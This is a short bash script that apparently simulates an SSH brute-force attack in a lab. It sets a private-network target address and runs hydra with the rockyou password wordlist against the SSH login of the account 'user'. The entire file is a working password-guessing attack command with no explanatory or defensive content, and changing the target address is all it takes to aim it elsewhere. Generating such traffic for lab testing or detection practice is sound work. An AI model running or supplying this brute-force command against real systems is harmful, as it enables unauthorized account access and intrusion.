#!/bin/bash

TARGET=192.168.56.30

echo "Starting SSH brute force simulation"

hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$TARGET